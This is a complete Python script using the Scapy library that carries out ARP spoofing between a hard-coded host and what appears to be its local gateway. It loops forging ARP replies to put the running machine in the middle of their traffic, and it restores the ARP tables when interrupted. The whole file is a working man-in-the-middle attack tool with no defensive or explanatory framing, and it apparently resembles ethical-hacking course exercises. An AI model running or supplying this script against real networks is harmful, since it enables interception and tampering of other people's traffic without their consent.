import scapy.all as scapy
import time as time
import sys

def get_mac(ip):
    arp_request = scapy.ARP()  # arp packet
    arp_request.pdst = ip
    broadcast = scapy.Ether()  # broadcasting packet
    broadcast.dst = "ff:ff:ff:ff:ff:ff"
    arp_request_broadcast = broadcast / arp_request
    answered_list=scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def sendpacket(targetip, spoofip):
    mac = get_mac(targetip)
    packet = scapy.ARP(op=2, pdst=targetip , hwdst=mac, psrc=spoofip)
    scapy.send(packet,verbose=False)

def restore(dest_ip,source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac= get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)


count=0
try:
    while True:
        sendpacket("192.168.43.17","192.168.43.1")
        sendpacket("192.168.43.1","192.168.43.17")
        print("\r"+str(count)+" packets send"),
        sys.stdout.flush()
        count=count+2
        time.sleep(2)
except KeyboardInterrupt:
    restore("192.168.43.1","192.168.43.17")
    restore("192.168.43.17","192.168.43.1")
    print("\ndetected ctrl c .... quitting ")
